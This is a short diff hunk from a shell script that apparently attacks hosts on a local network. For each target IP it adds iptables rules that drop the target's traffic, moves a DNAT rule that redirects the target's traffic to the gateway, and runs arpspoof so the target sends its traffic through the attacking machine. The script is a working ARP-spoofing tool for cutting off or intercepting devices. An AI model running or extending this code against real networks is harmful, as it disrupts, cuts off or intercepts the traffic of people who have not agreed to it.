@@ -32,9 +32,9 @@ for TARGET in $TARGET_IPS; do
     # Basic blocking rules
     iptables -A FORWARD -s "$TARGET" -j DROP
     iptables -A FORWARD -d "$TARGET" -j DROP
-    iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
     iptables -A INPUT -s "$TARGET" -j DROP
     iptables -A OUTPUT -d "$TARGET" -j DROP
+    iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
   
     (
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
